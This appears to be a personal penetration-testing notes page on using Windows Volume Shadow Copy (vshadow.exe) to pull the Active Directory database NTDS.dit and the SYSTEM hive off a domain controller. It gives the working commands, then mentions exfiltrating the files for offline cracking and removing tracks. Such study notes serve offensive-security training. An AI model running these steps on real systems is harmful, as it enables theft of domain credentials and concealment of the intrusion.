public:: true
alias:: VSS, Volume Shadow Service

- [Shadow Copy](https://en.wikipedia.org/wiki/Shadow_Copy) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes, even when they are in use.
- [`vshadow.exe`](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) (part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/)) is a utility that allows administrators to create and manage snapshots. It can be abused to extract the *Active Directory Database* [[NTDS.dit]] and the [SYSTEM hive](((65a94684-cdb5-4d91-b092-4044b38ce47e))) from the filesystem.
- To extract the *NTDS.dit* and the *SYSTEM hive* from a DC we can take the following steps in an elevated prompt
	- Create a shadow copy of the whole `C:` partition
	  ```cmd
	  C:\Tools> vshadow.exe -nw -p  C:
	  ```
		- `-nw` [disable writers](https://learn.microsoft.com/en-us/windows/win32/vss/shadow-copy-creation-details#shadow-copies-without-writer-participation) to speed up backup creation.
		- `-p` to store the copy on disk.
	- Take note of the newly created shadow copy device name
	  ```cmd
	  [...]
	  * SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
	     - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
	     - Original count of shadow copies = 1
	     - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
	     - Creation Time: 9/19/2022 4:31:51 AM
	     - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
	     - Originating machine: DC1.corp.com
	     - Service machine: DC1.corp.com
	     - Not Exposed
	     - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
	     - Attributes:  Auto_Release No_Writers Differential
	  
	  
	  Snapshot creation done.
	  ```
		- In this case is `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`.
	- Extract the *NTDS.dit* file from the shadow copy
	  ```cmd
	  C:\Tools> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
	  ```
	- Extract the SYSTEM hive from the windows registry
	  ```cmd
	  C:\> reg.exe save hklm\system c:\system.bak
	  ```
	- Exfiltrate the two `.bak` files to your Kali machine to crack them offline
	- Remove tracks
		- TODO delete the shadow copy
		  background-color:: pink
		- TODO delete the two `.bak` files
		  background-color:: pink
- You can now proceed to decrypt the NTDS.dit file offline
	- {{embed ((65a95382-e8f2-483f-8991-4b8bc67bcb7a))}}